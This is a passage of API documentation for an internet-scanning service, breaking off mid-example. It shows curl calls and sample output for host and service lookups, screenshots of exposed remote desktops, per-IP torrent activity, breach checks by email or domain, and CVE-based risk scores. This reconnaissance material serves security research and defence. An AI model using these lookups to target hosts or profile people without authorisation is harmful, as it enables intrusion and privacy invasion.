# API V2 Documentation

- - -

    API V2 - For Free, Starter and Business accounts. 

    Get Access via [https://app.binaryedge.io](https://app.binaryedge.io)

- - -

**Base URL** : https://api.binaryedge.io/v2/

**Key Header** : X-Key

```shell
curl 'https://api.binaryedge.io/v2/<endpoint>' -H 'X-Key:API_KEY'
```

## Swagger Definition

You can download the Swagger OpenApi specification file : [v2.yaml](/swagger/v2.yaml). You can use this with Postman or any other client tool.

## User

#### /v2/user/subscription

Return details about your current subscription package.

*Output*

```shell
curl 'https://api.binaryedge.io/v2/user/subscription' -H 'X-Key:API_KEY'
```

```json
{
  "subscription":{
    "name":"Starter"
  },
  "end_date":"2019-06-17",
  "requests_left":4942,
  "requests_plan":5000
}
```

## Query

### Host

#### /v2/query/ip/{target}

Details about an Host. List of recent events for the specified host, including details of exposed ports and services.

**Note**: Querying CIDRs is available for paid subscriptions only. When using CIDR, the number of credits that will be spent correspond to the number of targets that returned results. Example: a request for a /24 (256 targets) in which only 200 targets have results, will decrement 200 credits.

*Parameters*

* target: [String] Target IP address or CIDR up to /24

*Output*

```shell
curl 'https://api.binaryedge.io/v2/query/ip/xxx.xxx.xxx.xxx' -H 'X-Key:API_KEY'
```

```json
{
  "total":2,
  "query":"xxx.xxx.xxx.xxx",
  "events":[
    {
      "results":[
        {
          "origin":{
            "module":"grabber",
            "port":41574,
            "ip":"xxx.xxx.xxx.xxx",
            "type":"service-simple",
            "ts":1537060019061,
            "country":"us"
          },
          "result":{
            "data":{
              "state":{
                "state":"open"
              },
              "service":{
                "banner":"HTTP/1.1 400 Bad Request\\r\\nDate: Sun, 16 Sep 2018 01:06:58 GMT\\r\\nContent-Type: text/html\\r\\nContent-Length: 268\\r\\nConnection: close\\r\\nserver: nginx\\r\\n\\r\\n<html>\\r\\n<head><title>400 The plain HTTP request was sent to HTTPS port</title></head>\\r\\n<body bgcolor=\"white\">\\r\\n<center><h1>400 Bad Request</h1></center>\\r\\n<center>The plain HTTP request was sent to HTTPS port</center>\\r\\n<hr><center>openresty</center>\\r\\n</body>\\r\\n</html>\\r\\n",
                "method":"probe_matching",
                "cpe":[
                  "cpe:/a:igor_sysoev:nginx"
                ],
                "name":"ssl/http",
                "product":"nginx"
              }
            }
          },
          "target":{
            "protocol":"tcp",
            "port":443,
            "ip":"xxx.xxx.xxx.xxx"
          }
        }
      ],
      "port":443
    },
    {
      "results":[
        {
          "origin":{
            "module":"grabber",
            "port":54894,
            "ip":"xxx.xxx.xxx.xxx",
            "type":"service-simple",
            "ts":1534658530845,
            "country":"de"
          },
          "result":{
            "data":{
              "state":{
                "state":"open"
              },
              "service":{
                "banner":"HTTP/1.1 302 Moved Temporarily\\r\\nServer: nginx\\r\\nDate: Sun, 19 Aug 2018 06:02:09 GMT\\r\\nContent-Type: text/html\\r\\nContent-Length: 154\\r\\nConnection: close\\r\\nLocation: http://www.baidu.com/\\r\\n\\r\\n<html>\\r\\n<head><title>302 Found</title></head>\\r\\n<body bgcolor=\"white\">\\r\\n<center><h1>302 Found</h1></center>\\r\\n<hr><center>nginx</center>\\r\\n</body>\\r\\n</html>\\r\\n",
                "method":"probe_matching",
                "cpe":[
                  "cpe:/a:igor_sysoev:nginx"
                ],
                "name":"http",
                "product":"nginx"
              }
            }
          },
          "target":{
            "protocol":"tcp",
            "port":80,
            "ip":"xxx.xxx.xxx.xxx"
          }
        }
      ],
      "port":80
    }
  ]
}
```

#### /v2/query/ip/historical/{target}

Details about an Host, with data up to 6 months.

List of events for the specified host, with events for each time that:

- A port was detected open
- A service was found running
- Other modules were successfully executed 

**Note**: Available for paid subscriptions only.

* 1 IP = 1 credit

*Parameters*

* target: [String] Target IP address 

*Output*

```shell
curl 'https://api.binaryedge.io/v2/query/ip/historical/xxx.xxx.xxx.xxx' -H 'X-Key:API_KEY'
```

```json
{
  "total": 4,
  "query": "xxx.xxx.xxx.xxx",
  "events": [{
    "target": {
      "ip": "xxx.xxx.xxx.xxx",
      "protocol": "tcp",
      "port": 25
    },
    "origin": {
      "type": "port",
      "ts": 1533433200683
    },
    "result": null
  }, {
    "target": {
      "ip": "xxx.xxx.xxx.xxx",
      "protocol": "tcp",
      "port": 25
    },
    "origin": {
      "type": "port",
      "ts": 1530560172852
    },
    "result": null
  }, {
    "target": {
      "ip": "xxx.xxx.xxx.xxx",
      "protocol": "tcp",
      "port": 25
    },
    "origin": {
      "type": "service-simple",
      "ts": 1533438628984
    },
    "result": {
      "data": {
        "state": {
          "state": "open"
        },
        "service": {
          "product": "Incapsula CDN httpd",
          "banner": "HTTP/1.1 503 Service Unavailable\\r\\nContent-Type: text/html\\r\\nCache-Control: no-cache\\r\\nConnection: close\\r\\nContent-Length: 655\\r\\nX-Iinfo: 9-332984787-0 0NNN RT(1533438628522 0) q(0 -1 -1 -1) r(0 -1)\\r\\n\\r\\n<html style=\"height:100%\"><head><META NAME=\"ROBOTS\" CONTENT=\"NOINDEX, NOFOLLOW\"><meta name=\"format-detection\" content=\"telephone=no\"><meta name=\"viewport\" content=\"initial-scale=1.0\"><meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\"></head><body style=\"margin:0px;height:100%\"><iframe src=\"/_Incapsula_Resource?CWUDNSAI=5&xinfo=9-332984787-0%200NNN%20RT%281533438628522%200%29%20q%280%20-1%20-1%20-1%29%20r%280%20-1%29&incident_id=0-1199990858670542825&edet=9&cinfo=ffffffff\" frameborder=0 width=\"100%\" height=\"100%\" marginheight=\"0px\" marginwidth=\"0px\">Request unsuccessful. Incapsula incident ID: 0-1199990858670542825</iframe></body></html>",
          "name": "http",
          "method": "probe_matching"
        }
      }
    }
  }, {
    "target": {
      "ip": "xxx.xxx.xxx.xxx",
      "protocol": "tcp",
      "port": 25
    },
    "origin": {
      "type": "service-simple",
      "ts": 1530601327765
    },
    "result": {
      "data": {
        "state": {
          "state": "open"
        },
        "service": {
          "product": "Incapsula CDN httpd",
          "banner": "HTTP/1.1 503 Service Unavailable\\r\\nContent-Type: text/html\\r\\nCache-Control: no-cache\\r\\nConnection: close\\r\\nContent-Length: 653\\r\\nX-Iinfo: 5-120325528-0 0NNN RT(1530601326800 0) q(0 -1 -1 -1) r(0 -1)\\r\\n\\r\\n<html style=\"height:100%\"><head><META NAME=\"ROBOTS\" CONTENT=\"NOINDEX, NOFOLLOW\"><meta name=\"format-detection\" content=\"telephone=no\"><meta name=\"viewport\" content=\"initial-scale=1.0\"><meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\"></head><body style=\"margin:0px;height:100%\"><iframe src=\"/_Incapsula_Resource?CWUDNSAI=5&xinfo=5-120325528-0%200NNN%20RT%281530601326800%200%29%20q%280%20-1%20-1%20-1%29%20r%280%20-1%29&incident_id=0-373539121141122165&edet=9&cinfo=ffffffff\" frameborder=0 width=\"100%\" height=\"100%\" marginheight=\"0px\" marginwidth=\"0px\">Request unsuccessful. Incapsula incident ID: 0-373539121141122165</iframe></body></html>",
          "name": "http",
          "method": "probe_matching"
        }
      }
    }
  }]
}
```

#### /v2/query/search 

Events based on a Query. List of recent events for the given query, including details of exposed ports and services. Can be used with specific parameters and/or full-text search.

* 1 page/request = 1 credit

*Query Parameters*

* query: [String] String used to query our data. If no filters are used, it will perform a full-text search on the entire events. See [Search Parameters](search.md) for details on what parameters can be used.
* page: [Int] Optional. Results page number.
    * Default: _page=1_
    * Max: _page=1000_ (20,000 results)
* only_ips: [Int] Optional. If _only\_ips=1_, only output IP addresses, ports and protocols. 
    * Default: _only\_ips=0_

*Output*

```shell
curl 'https://api.binaryedge.io/v2/query/search?query=name:ldap%20AND%20ip:xxx.xxx.xxx.xxx' -H 'X-Key:API_KEY'
```

```json
{
  "query":"name:ldap AND ip:xxx.xxx.xxx.xxx",
  "total": 2,
  "page": 1,
  "pagesize": 20,
  "events": [
    {
      "origin":{
        "type":"service-simple",
        "module":"grabber",
        "country":"uk",
        "ts":1535985193912,
        "ip":"xxx.xxx.xxx.xxx",
        "port":48872
      },
      "target":{
        "ip":"xxx.xxx.xxx.xxx",
        "port":389,
        "protocol":"tcp"
      },
      "result":{
        "data":{
          "service":{
            "name":"ldap",
            "method":"table_default"
          },
          "state":{
            "state":"open|filtered"
          }
        }
      }
    },
    {
      "origin":{
        "type":"service-simple",
        "module":"grabber",
        "country":"us",
        "ts":1535985193942,
        "ip":"xxx.xxx.xxx.xxx",
        "port":38226
      },
      "target":{
        "ip":"xxx.xxx.xxx.xxx",
        "port":389,
        "protocol":"tcp"
      },
      "result":{
        "data":{
          "service":{
            "name":"ldap",
            "method":"table_default"
          },
          "state":{
            "state":"open|filtered"
          }
        }
      }
    }
  ] 
}
```

#### /v2/query/search/stats 

Statistics of recent events for the given query. Can be used with specific parameters and/or full-text search.

*Parameters*

* query: [String] String used to query our data. If no filters are used, it will perform a full-text search on the entire events. See [Search Parameters](search.md) for details on what parameters can be used.
* type: [String] Type of statistic we want to obtain. Possible types include:
    * _ports_, _products_, _versions_, _tags_, _services_, _countries_, _asn_.
* order: [String] Optional. Whether to sort descendently or ascendently to get the top.
    * _desc_, _asc_
    * Default: _order=desc_

*Output*

```shell
curl 'https://api.binaryedge.io/v2/query/search/stats?query=name:ldap%20AND%20ip:xxx.xxx.xxx.xxx&type=ports' -H 'X-Key:API_KEY'
```

```json
[
  {
    "key": "80/tcp",
    "doc_count": 4467584
  },
  {
    "key": "22/tcp",
    "doc_count": 4244020
  },
  {
    "key": "53/tcp",
    "doc_count": 3566098
  },
  {
    "key": "443/tcp",
    "doc_count": 3478298
  },
  {
    "key": "21/tcp",
    "doc_count": 2726635
  },
  {
    "key": "3389/tcp",
    "doc_count": 2303493
  },
  {
    "key": "1900/tcp",
    "doc_count": 2172479
  },
  {
    "key": "123/tcp",
    "doc_count": 2111621
  },
  {
    "key": "23/tcp",
    "doc_count": 1988782
  },
  {
    "key": "8000/tcp",
    "doc_count": 1931731
  }
]
```

### Image

#### /v2/query/image/ip/{target}

Details about Remote Desktops found on an Host. List of screenshots and details extracted from them for the specified host, including OCR and whether faces were found or not, with data up to 2 months.

*Parameters*

* target: [String] Target IP address 
* page: [Int] Optional. Results page number.
    * Default: _page=1_

*Output*

```shell
curl 'https://api.binaryedge.io/v2/query/image/ip/xxx.xxx.xxx.xxx' -H 'X-Key:API_KEY'
```

```json
{
  "pagesize":20,
  "query":"xxx.xxx.xxx.xxx",
  "total":1,
  "page":1,
  "events":[
    {
      "thumb":"https://d3f9qnon04ymh2.cloudfront.net/993cad4bb78fc0fa3e8f5f1d07311af802ea73ac48b6143c6286ae54df.jpg",
      "tags":[
        "VNC"
      ],
      "ts":1536345753000,
      "port":5900,
      "url":"https://d1ngxp4ef6grqi.cloudfront.net/993cad4bb78fc0fa3e8f5f1d07311af802ea73ac48b6143c6286ae54df.jpg",
      "height":800,
      "geoip":{
        "iso_code":"BE",
        "timezone":"Europe/Brussels",
        "latitude":50.85,
        "longitude":4.35,
        "location":[
          4.35,
          50.85
        ],
        "country_name":"Belgium",
        "city_name":null
      },
      "ip":"xxx.xxx.xxx.xxx",
      "country":"BE",
      "as_name":"Proximus NV",
      "asn":5432,
      "width":1280,
      "image_id":"993cad4bb78fc0fa3e8f5f1d07311af802ea73ac48b6143c6286ae54df"
    }
  ]
}
```

#### /v2/query/image/search

Remote Desktops based on a Query. List of screenshots and details extracted from them for the given query, including OCR and whether faces were found or not. Can be used with specific parameters and/or full-text search.

*Parameters*

* query: [String] String used to query our data. If no filters are used, it will perform a full-text search on the entire events. See [Search Parameters](image-search.md) for details on what parameters can be used.
* page: [Int] Optional. Results page number.
    * Default: _page=1_
    * Max: _page=750_ (15,000 results)

*Output*

```shell
curl 'https://api.binaryedge.io/v2/query/image/search?query=ip:xxx.xxx.xxx.xxx%20AND%20country:BE' -H 'X-Key:API_KEY'
```

```json
{
  "pagesize":20,
  "query":"ip:xxx.xxx.xxx.xxx AND country:BE",
  "total":1,
  "page":1,
  "events":[
    {
      "thumb":"https://d3f9qnon04ymh2.cloudfront.net/993cad4bb78fc0fa3e8f5f1d07311af802ea73ac48b6143c6286ae54df.jpg",
      "tags":[
        "VNC"
      ],
      "ts":1536345753000,
      "port":5900,
      "url":"https://d1ngxp4ef6grqi.cloudfront.net/993cad4bb78fc0fa3e8f5f1d07311af802ea73ac48b6143c6286ae54df.jpg",
      "height":800,
      "geoip":{
        "iso_code":"BE",
        "timezone":"Europe/Brussels",
        "latitude":50.85,
        "longitude":4.35,
        "location":[
          4.35,
          50.85
        ],
        "country_name":"Belgium",
        "city_name":null
      },
      "ip":"xxx.xxx.xxx.xxx",
      "country":"BE",
      "as_name":"Proximus NV",
      "asn":5432,
      "width":1280,
      "image_id":"993cad4bb78fc0fa3e8f5f1d07311af802ea73ac48b6143c6286ae54df"
    }
  ]
}
```

#### /v2/query/image/tags

Get the list of possible tags for the images.

*Output*

```shell
curl 'https://api.binaryedge.io/v2/query/image/tags' -H 'X-Key:API_KEY'
```

```json
["RDP", "VNC", "HAS_FACES", "X11", "WINDOWS", "MOBILE"]
```

### Torrent

#### /v2/query/torrent/ip/{target}

**Note**: Available for paid subscriptions only.

Details about torrents transferred by an Host. List of recent torrent events for the specified host, including details of the peer and torrent. See [Torrent Data](torrent.md) for more details.

*Parameters*

* target: [String] Target IP address 

*Output*

```shell
curl 'https://api.binaryedge.io/v2/query/torrent/ip/xxx.xxx.xxx.xxx' -H 'X-Key:API_KEY'
```

```json
{
  "query":"xxx.xxx.xxx.xxx",
  "total":5,
  "events":[
    {
      "origin":{
        "type":"peer",
        "module":"torrent",
        "ts":1539766360923
      },
      "peer":{
        "ip":"xxx.xxx.xxx.xxx",
        "port":29252
      },
      "torrent":{
        "infohash":"0912d200210318a5f65450e63834f4100293ae48",
        "name":"A.Family.for.the.Holidays.2018.BRRip.XviD.AC3-EVO[TGx]",
        "source":"ThePirateBay",
        "category":"Video",
        "subcategory":"Movies"
      }
    },
    {
      "origin":{
        "type":"peer",
        "module":"torrent",
        "ts":1539740702093
      },
      "peer":{
        "ip":"xxx.xxx.xxx.xxx",
        "port":29252
      },
      "torrent":{
        "infohash":"5d917a61489cba4ad346962f352b64b2c652e43b",
        "name":"Big.Hero.6.The.Series.S01E23E24E25.AMZN.WEB-DL.XviD.MP3",
        "source":"ThePirateBay",
        "category":"Video",
        "subcategory":"TV shows"
      }
    },
  ]
}
```

#### /v2/query/torrent/historical/{target}

**Note**: Available for paid subscriptions only.

Details about torrents transferred by an Host, with data up to 6 months.

List of torrent events for the specified host, with events for each time that a new transfer was detected on the DHT. See [Torrent Data](torrent.md) for more details.

**Note**: Available for paid subscriptions only.

*Parameters*

* target: [String] Target IP address 

*Output*

```shell
curl 'https://api.binaryedge.io/v2/query/torrent/historical/xxx.xxx.xxx.xxx' -H 'X-Key:API_KEY'
```

```json
{
  "query":"xxx.xxx.xxx.xxx",
  "total":104,
  "events":[
    {
      "origin":{
        "type":"peer",
        "module":"torrent",
        "ts":1539766360923
      },
      "peer":{
        "ip":"xxx.xxx.xxx.xxx",
        "port":29252
      },
      "torrent":{
        "infohash":"0912d200210318a5f65450e63834f4100293ae48",
        "name":"A.Family.for.the.Holidays.2018.BRRip.XviD.AC3-EVO[TGx]",
        "source":"ThePirateBay",
        "category":"Video",
        "subcategory":"Movies"
      }
    },
    {
      "origin":{
        "type":"peer",
        "module":"torrent",
        "ts":1539766357370
      },
      "peer":{
        "ip":"xxx.xxx.xxx.xxx",
        "port":29252
      },
      "torrent":{
        "infohash":"0912d200210318a5f65450e63834f4100293ae48",
        "name":"A.Family.for.the.Holidays.2018.BRRip.XviD.AC3-EVO[TGx]",
        "source":"ThePirateBay",
        "category":"Video",
        "subcategory":"Movies"
      }
    },
    {
      "origin":{
        "type":"peer",
        "module":"torrent",
        "ts":1539740702093
      },
      "peer":{
        "ip":"xxx.xxx.xxx.xxx",
        "port":29252
      },
      "torrent":{
        "infohash":"5d917a61489cba4ad346962f352b64b2c652e43b",
        "name":"Big.Hero.6.The.Series.S01E23E24E25.AMZN.WEB-DL.XviD.MP3",
        "source":"ThePirateBay",
        "category":"Video",
        "subcategory":"TV shows"
      }
    },
    {
      "origin":{
        "type":"peer",
        "module":"torrent",
        "ts":1539740701112
      },
      "peer":{
        "ip":"xxx.xxx.xxx.xxx",
        "port":29252
      },
      "torrent":{
        "infohash":"5d917a61489cba4ad346962f352b64b2c652e43b",
        "name":"Big.Hero.6.The.Series.S01E23E24E25.AMZN.WEB-DL.XviD.MP3",
        "source":"ThePirateBay",
        "category":"Video",
        "subcategory":"TV shows"
      }
    }
  ]
}
```

#### /v2/query/torrent/search

**Note**: Available for paid subscriptions only.

Events based on a Query. List of recent events for the given query, including details of the peer and torrent. Can be used with specific parameters and/or full-text search.

*Parameters*

* query: [String] String used to query our data. If no filters are used, it will perform a full-text search on the entire events. See [Search Parameters](torrents-search.md) for details on what parameters can be used.
* page: [Int] Optional. Results page number.
    * Default: _page=1_
    * Max: _page=750_ (15,000 results)

*Output*

```shell
curl 'https://api.binaryedge.io/v2/query/torrent/search?query=category:video' -H 'X-Key:API_KEY'
```

```json
{
  "query":"category:video",
  "page":1,
  "pagesize":20,
  "total":3149612,
  "events":[
    {
      "origin":{
        "type":"peer",
        "module":"torrent",
        "ts":1565166671255
      },
      "node":{
        "ip":"xxx.xxx.xxx.xxx",
        "port":2949
      },
      "peer":{
        "ip":"xxx.xxx.xxx.xxx",
        "port":6881
      },
      "torrent":{
        "infohash":"d5380fcda66b48fb8b521d5c3b5e61b91c94775e",
        "name":"Britain's Best Back Gardens Series",
        "source":"ThePirateBay",
        "category":"Video",
        "subcategory":"TV shows"
      }
    },
    {
      "origin":{
        "type":"peer",
        "module":"torrent",
        "ts":1565166671242
      },
      "node":{
        "ip":"xxx.xxx.xxx.xxx",
        "port":8999
      },
      "peer":{
        "ip":"xxx.xxx.xxx.xxx",
        "port":24279
      },
      "torrent":{
        "infohash":"d5380fcda66b48fb8b521d5c3b5e61b91c94775e",
        "name":"Britain's Best Back Gardens Series",
        "source":"ThePirateBay",
        "category":"Video",
        "subcategory":"TV shows"
      }
    }
  ]
}
```

#### /v2/query/torrent/search/stats

Statistics of events for the given query. Can be used with specific parameters and/or full-text search.

*Parameters*

* query: [String] String used to query our data. If no filters are used, it will perform a full-text search on the entire events. See [Search Parameters](torrents-search.md) for details on what parameters can be used.
* type: [String] Type of statistic we want to obtain. Possible types include:
    * _ports_, _countries_, _asn_, _ips_, _rdns_, _categories_, _names_.
* days: [Integer] Optional. Number of days to get the stats for. For example, days=1 for the last day of data.
    * Default: _days=90_
    * Max: _days=90_
* order: [String] Optional. Whether to sort descendently or ascendently to get the top.
    * _desc_, _asc_
    * Default: _order=desc_

*Output*

```shell
curl 'https://api.binaryedge.io/v2/query/torrent/search/stats?query=category:video&type=ports' -H 'X-Key:API_KEY'
```

```json
[
  {
    "key":1,
    "doc_count":168056
  },
  {
    "key":8999,
    "doc_count":133738
  },
  {
    "key":6881,
    "doc_count":91512
  },
  {
    "key":51413,
    "doc_count":58998
  },
  {
    "key":1200,
    "doc_count":35127
  }
]
```

### Dataleaks

Allows you to search across multiple data breaches to see if any of your email addresses has been compromised. If you are affected, we recommend you change your password on the respective services.

#### /v2/query/dataleaks/email/{email}

Verify how many dataleaks affected an specific email address.

**Note**: Available for paid subscriptions only.

*Parameters*

* email: [String] Verify which dataleaks affect the target email.

*Output*

```shell
curl 'https://api.binaryedge.io/v2/query/dataleaks/email/user@example.com' -H 'X-Key:API_KEY'
```

```json
{
  "total": 18,
  "events": ["antipublic", "ashleymadison", "breachcompilation", "cannabis", "dropbox", "exploitin", "fling", "imesh", "lastfm", "linkedin", "mate1", "neopets", "pastebin", "rsboards", "tianya", "torrentinvites", "tumblr", "vk"],
  "query": "user@example.com"
}
```

#### /v2/query/dataleaks/organization/{domain}

**Note**: Available for paid subscriptions only.

Verify how many emails are affected by dataleaks for a specific domain. We don't provide the list of affected emails.

For example, searching for the domain 'example.com' returns {"leak":"linkedin", "count":805}, this means there are 805 accounts with an example.com email on the Linkedin dump.

*Parameters*

* domain: [String] Verify which dataleaks affect the target domain.

*Output*

```shell
curl 'https://api.binaryedge.io/v2/query/dataleaks/organization/example.com' -H 'X-Key:API_KEY'
```

```json
{
  "total":192656,
  "groups":[
    {"leak":"antipublic", "count":44489},
    {"leak":"exploitin", "count":19995},
    {"leak":"badoo", "count":13028},
    {"leak":"myspace", "count":26266}, 
    {"leak":"vk", "count":2132},
    {"leak":"imesh", "count":7549},
    {"leak":"breachcompilation", "count":58833},
    {"leak":"mate1", "count":2923},
    {"leak":"webhost", "count":152},
    {"leak":"fling", "count":3058},
    {"leak":"adobe", "count":734},
    {"leak":"dropbox", "count":1832},
    {"leak":"zoosk", "count":2506},
    {"leak":"pastebin", "count":2417},
    {"leak":"ashleymadison", "count":963},
    {"leak":"neopets", "count":1772},
    {"leak":"tumblr", "count":789},
    {"leak":"taobao", "count":98},
    {"leak":"xat", "count":774},
    {"leak":"linkedin", "count":805},
    {"leak":"tianya", "count":171},
    {"leak":"youporn", "count":107},
    {"leak":"leet", "count":84},
    {"leak":"lastfm", "count":413},
    {"leak":"modernbusinesssolutions", "count":134},
    {"leak":"7k7k", "count":84},
    {"leak":"myrepospace", "count":11},
    {"leak":"mpgh", "count":62},
    {"leak":"r2games", "count":64},
    {"leak":"patreon", "count":17},
    {"leak":"twitter", "count":66},
    {"leak":"yahoo", "count":2},
    {"leak":"nihonomaru", "count":34},
    {"leak":"gawker", "count":26},
    {"leak":"nulled", "count":10},
    {"leak":"habbo", "count":31},
    {"leak":"abusewithus", "count":23},
    {"leak":"rsboards", "count":14},
    {"leak":"cannabis", "count":25},
    {"leak":"torrentinvites", "count":15},
    {"leak":"dlh", "count":11},
    {"leak":"utorrent", "count":8},
    {"leak":"nextgenupdate", "count":30},
    {"leak":"xsplit", "count":26},
    {"leak":"clixsense", "count":9},
    {"leak":"brazzers", "count":5},
    {"leak":"adultfriendfinder", "count":10},
    {"leak":"majorgeeks", "count":4},
    {"leak":"plex", "count":1},
    {"leak":"thebot", "count":4},
    {"leak":"acne", "count":4},
    {"leak":"cheapassgamer", "count":2},
    {"leak":"ps3hax", "count":6},
    {"leak":"vbulletin", "count":5},
    {"leak":"gta", "count":1},
    {"leak":"latimes", "count":1},
    {"leak":"loungeboard", "count":1},
    {"leak":"crackingforum", "count":3},
    {"leak":"experian", "count":1},
    {"leak":"androidforums", "count":1},
    {"leak":"abandonia", "count":1},
    {"leak":"minefield", "count":1},
    {"leak":"delicioustakoyaki", "count":3},
    {"leak":"hawkingtech", "count":1},
    {"leak":"newseasims", "count":1},
    {"leak":"blackhatworld", "count":3},
    {"leak":"win7vista", "count":1},
    {"leak":"sexavet", "count":1},
    {"leak":"muslimmatch", "count":1},
    {"leak":"forbes", "count":1},
    {"leak":"sktorrent", "count":1}
  ],
  "query":"example.com"
}
```

#### /v2/query/dataleaks/info

Get all available information about the dataleaks our platform keeps track.


*Parameters*

* leak: [String] Return information about a specific dataleak. If not used will return all.

*Output*

```shell
curl 'https://api.binaryedge.io/v2/query/dataleaks/info' -H 'X-Key:API_KEY'
```

```json
{
    "abcdomain": {
    "name": "abcdomain",
    "fullname": "ABCDomain",
    "description": "ABC Domain is a web hosting company based in Armenia.",
    "date": "2013-01-01",
    "year": 2013,
    "data": "Email addresses, Passwords, Usernames",
    "logo": "https://s3-eu-west-1.amazonaws.com/be-resources/dataleaks/abcdomain.png",
    "features": [
      "Email addresses",
      "Passwords",
      "Usernames"
    ]
  },
  "thredup": {
    "name": "thredup",
    "fullname": "thredUp",
    "description": "thredUP is a fashion resale website for consumers to buy and sell secondhand clothing online",
    "date": "2019-09-01",
    "year": 2019,
    "data": "Email addresses, IP addresses, Geographic locations, Phone numbers",
    "logo": "https://s3-eu-west-1.amazonaws.com/be-resources/dataleaks/thredup.png",
    "features": [
      "Email addresses",
      "IP addresses",
      "Geographic locations",
      "Phone numbers"
    ]
  },
  "spyfone": {
    "name": "spyfone",
    "fullname": "SpyFone",
    "description": "In August 2018, the spyware company <a href=\"https://motherboard.vice.com/en_us/article/9kmj4v/spyware-company-spyfone-terabytes-data-exposed-online-leak\" target=\"_blank\" rel=\"noopener\">SpyFone left terabytes of data publicly exposed</a>. Collected surreptitiously whilst the targets were using their devices, the data included photos, audio recordings, text messages and browsing history which were then exposed via a number of misconfigurations within SpyFone's systems. The data belonged the thousands of SpyFone customers and included 44k unique email addresses, many likely belonging to people the targeted phones had contact with.",
    "date": "2018-08-16",
    "year": 2018,
    "data": "Audio recordings, Browsing histories, Device information, Email addresses, Geographic locations, IMEI numbers, IP addresses, Names, Passwords, Photos, SMS messages",
    "logo": "https://s3-eu-west-1.amazonaws.com/be-resources/dataleaks/SpyFone.png",
    "features": [
      "Audio recordings",
      "Browsing histories",
      "Device information",
      "Email addresses",
      "Geographic locations",
      "IMEI numbers",
      "IP addresses",
      "Names",
      "Passwords",
      "Photos",
      "SMS messages"
    ]
  }
}
```

### Risk Score

#### /v2/query/score/ip/{target}

IP Risk Score. Scoring is based on all information found on our databases regarding an IP and refers to the level of exposure of a target, i.e, the higher the score, the greater the risk of exposure. 

More details about scoring can be found on [https://github.com/binaryedge/ratemyip-openframework/blob/master/ip-score.md](https://github.com/binaryedge/ratemyip-openframework/blob/master/ip-score.md).

**Note**: Available for paid subscriptions only.

*Parameters*

* target: [String] Target IP address 

*Output*

```shell
curl 'https://api.binaryedge.io/v2/query/score/ip/xxx.xxx.xxx.xxx' -H 'X-Key:API_KEY'
```

```json
{
  "normalized_ip_score": 97.1,
  "normalized_ip_score_detailed": {
    "cve": 100,
    "attack_surface": 100,
    "encryption": 100,
    "rms": 100,
    "storage": 100,
    "web": 100,
    "torrents": 0
  },
  "ip_score_detailed": {
    "cve": 3,
    "attack_surface": 2,
    "encryption": 6,
    "rms": 10,
    "storage": 10,
    "web": 3,
    "torrents": 0
  },
  "results_detailed": {
    "ports": {
      "open": [
        4991,
        6666,
        22,
        443,
        3389,
        5901,
        23,
        80,
        1883,
        27017,
        6379,
        11211,
        9200,
        21,
        8080,
        25,
        3306
      ],
      "score": 17
    },
    "cve": {
      "result": [
        {
          "port": 4991,
          "cve": [
            {
              "cpe": "cpe:/a:igor_sysoev:nginx:1.2.6",
              "cve_list": [
                {
                  "cve": "CVE-2013-2070",
                  "cvss": 5.8
                },
                {
                  "cve": "CVE-2013-4547",
                  "cvss": 7.5
                },
                {
                  "cve": "CVE-2014-3616",
                  "cvss": 4.3
                },
                {
                  "cve": "CVE-2016-1247",
                  "cvss": 7.2
                },
                {
                  "cve": "CVE-2016-0742",
                  "cvss": 5
                },
                {
                  "cve": "CVE-2016-0746",
                  "cvss": 7.5
                },
                {
                  "cve": "CVE-2016-0747",
                  "cvss": 5
                },
                {
                  "cve": "CVE-2016-4450",
                  "cvss": 5
                }
              ],
              "score": 47.3
            }
          ],
          "score": 47.3
        },
        {
          "port": 6666,
          "cve": [
            {
              "product": "Postgres-XC",
              "version": "1.1",
              "cve_list": [],
              "score": 0
            },
          ],
          "score": 0
        },
        {
          "port": 6666,
          "cve": [
            {
              "cpe": "cpe:/a:mysql:mysql:5.5.18.1",
              "cve_list": [
                {
                  "cve": "CVE-2005-1274",
                  "cvss": 10
                },
                {
                  "cve": "CVE-2005-0081",
                  "cvss": 5
                },
                {
                  "cve": "CVE-2005-0082",
                  "cvss": 5
                },
                {
                  "cve": "CVE-2005-0684",
                  "cvss": 10
                },
                {
                  "cve": "CVE-2012-2750",
                  "cvss": 10
                },
                {
                  "cve": "CVE-2012-4414",
                  "cvss": 6.5
                },
                {
                  "cve": "CVE-2011-2262",
                  "cvss": 5
                },
                {
                  "cve": "CVE-2012-0112",
                  "cvss": 3.5
                },
                {
                  "cve": "CVE-2012-0113",
                  "cvss": 5.5
                },
                {
                  "cve": "CVE-2012-0115",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2012-0116",
                  "cvss": 4.9
                },
                {
                  "cve": "CVE-2012-0117",
                  "cvss": 3.5
                },
                {
                  "cve": "CVE-2012-0118",
                  "cvss": 4.9
                },
                {
                  "cve": "CVE-2012-0119",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2012-0120",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2012-0553",
                  "cvss": 7.5
                },
                {
                  "cve": "CVE-2012-2102",
                  "cvss": 3.5
                },
                {
                  "cve": "CVE-2012-2122",
                  "cvss": 5.1
                },
                {
                  "cve": "CVE-2012-2749",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2013-1492",
                  "cvss": 7.5
                },
                {
                  "cve": "CVE-2015-3152",
                  "cvss": 4.3
                },
                {
                  "cve": "CVE-2016-0610",
                  "cvss": 3.5
                },
                {
                  "cve": "CVE-2016-0616",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2013-5807",
                  "cvss": 4.9
                },
                {
                  "cve": "CVE-2016-6664",
                  "cvss": 6.9
                },
                {
                  "cve": "CVE-2004-0931",
                  "cvss": 5
                },
                {
                  "cve": "CVE-2017-3302",
                  "cvss": 5
                },
                {
                  "cve": "CVE-2016-7412",
                  "cvss": 6.8
                },
                {
                  "cve": "CVE-2012-5627",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2014-0001",
                  "cvss": 7.5
                },
                {
                  "cve": "CVE-2016-6662",
                  "cvss": 10
                },
                {
                  "cve": "CVE-2009-4833",
                  "cvss": 5.8
                },
                {
                  "cve": "CVE-2012-0485",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2012-0486",
                  "cvss": 5
                },
                {
                  "cve": "CVE-2012-0487",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2012-0488",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2012-0489",
                  "cvss": 4
                },
